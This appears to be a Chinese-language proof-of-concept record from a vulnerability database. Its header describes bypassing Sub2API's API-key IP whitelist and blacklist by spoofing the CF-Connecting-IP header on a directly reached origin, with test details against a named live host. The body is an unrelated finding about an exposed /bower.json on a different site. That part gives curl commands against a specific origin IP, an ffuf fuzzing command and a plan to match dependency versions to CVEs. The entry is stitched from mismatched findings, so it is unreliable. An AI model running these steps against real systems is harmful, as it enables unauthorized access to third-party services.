# Sub2API API Key ip_whitelist/ip_blacklist 可被 CF-Connecting-IP 头伪造绕过（直连源站）

- **code**: sub2api-apikey-ip-whitelist-bypass-via-cf-connecting-ip
- **kind**: poc
- **category**: auth-bypass
- **component**: Sub2API (Wei-Shaw/sub2api) / API key 鉴权中间件
- **severity**: high
- **language**: http
- **source**: self
- **verified**: 1
- **verified_note**: 2026-11-08 在 dahurj999.top（源站直连 23.147.164.112:443）用 user1013 JWT + key 1402 实测：PUT ip_whitelist=["10.0.0.1"] 后无头请求 /v1/models → 403 76B {"code":"ACCESS_DENIED","message":"Access denied. Your IP is 103.197.69.66"}；加 -H "CF-Connecting-IP: 10.0.0.1" → 403 72B {"code":"INSUFFICIENT_BALANCE"}；加 "CF-Connecting-IP: 1.2.3.4" → "Your IP is 1.2.3.4"。黑名单 ["103.197.69.66"] 同样被 CF-Connecting-IP: 8.8.8.8 绕过。已报 finding 11725/1298。
- **tags**: sub2api,cf-connecting-ip,ip-whitelist-bypass,auth-bypass,api-key,cloudflare-bypass
- **created_at**: 2026-11-07T17:41:13.763Z
- **engine**: https://dahurj999.top (源站 23.147.164.112:443)

## 描述

Sub2API 的 key 级 ip_whitelist/ip_blacklist 校验在 key 鉴权中间件内生效（403 ACCESS_DENIED 76B 并回显所判定 IP），但客户端 IP 优先取请求头 CF-Connecting-IP；源站可直连（绕过 Cloudflare）时，任意客户端伪造该头即可绕过白名单/黑名单。判据：无头 403 ACCESS_DENIED 76B vs 加 CF-Connecting-IP:<白名单内地址> 后 403 INSUFFICIENT_BALANCE 72B（72B=已通过鉴权卡余额）；伪造 1.2.3.4 时回显 "Your IP is 1.2.3.4" 直接证明取头值。经 Cloudflare 访问时 CF 会覆写该头，需源站直连。

## 用法

```
1) 先确认源站 IP 可直连（curl --noproxy "*" --resolve <域名>:443:<源IP>）；2) 目标 key 在 /v1/models 上表现为 401 INVALID_API_KEY(54B)=key 无效、403 INSUFFICIENT_BALANCE(72B)=key+IP 校验全过、403 ACCESS_DENIED(76B, 回显IP)=被 IP 规则拒；3) 对受限 key 加 -H "CF-Connecting-IP: <白名单内任意IP>" 重放 /v1/models，72B 即绕过成立；4) 还可顺带测该头能否绕过按 IP 计算的 429 限流。
```

## 正文

```
# shopto.net 源站 /bower.json 依赖清单匿名泄露

## 前置
- 直连源站 IP:443（CloudFront 源站，直连绕边缘 WAF）
- `curl -k`（忽略证书）；本机挂代理时加 `--noproxy '*'` 直连
- 请求头 `Host` 设任意非业务值（如 localhost）命中默认 vhost
- 旧 vhost 建议 `--http1.0`

## 复现
```bash
# 命中
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' \
     https://3.8.196.174/bower.json -w '\n%{http_code} %{size_download}\n'
```

命中回显：
```
HTTP/1.1 200 OK
Server: Apache
Content-Length: 629
Content-Type: application/json

{
  "name": "<dcshop 商家前端包名>",
  "version": "1.2.0",
  "dependencies": {
    "normalize-css": "~v4.2.0",
    "jquery": "~1.9.1",
    "bootstrap": "~3.3.7",
    "font-awesome": "4.7.0",
    "moment": "2.20.1",
    "eonasdan-bootstrap-datetimepicker": "^4.17.47"
  },
  "private": true
}
```

## 对照判据
```bash
# 同目录相似文件被名称规则保护
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.json -o /dev/null -w '%{http_code}\n'   # → 403
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/composer.lock -o /dev/null -w '%{http_code}\n'   # → 403
# 随机不存在路径
curl -sk --noproxy '*' --http1.0 -H 'Host: localhost' https://3.8.196.174/nope-xyz -o /dev/null -w '%{http_code}\n'          # → 404
```
- `bower.json` = 200 且返回 JSON 依赖清单，而 `composer.json/.lock` = 403 ⇒ 判定 `bower.json` 属被遗漏、未纳入 `.htaccess` 名称保护的构建清单，而非有意公开。
- 随机路径 404 ⇒ 排除"整站兜底 200"假象。

## 铺面（找同类遗漏）
```bash
ffuf -u https://3.8.196.174/FUZZ -H 'Host: localhost' -k -w <wordlist> -mc 200 -fs <默认404字节数>
# 候选：bower.json package.json package-lock.json yarn.lock composer.json composer.lock .bowerrc gulpfile.js Gruntfile.js
```

## 利用方向
拿到前端依赖版本后，与公开 CVE 库比对（如 jquery 1.9.1 / bootstrap 3.3.7 / moment 2.20.1），对前端组件做定向漏洞匹配。

## 证伪条件
再次请求 `/bower.json` 返回 403/404（保护已补齐），或返回内容不含包名/依赖版本 ⇒ 本结论不成立。

```
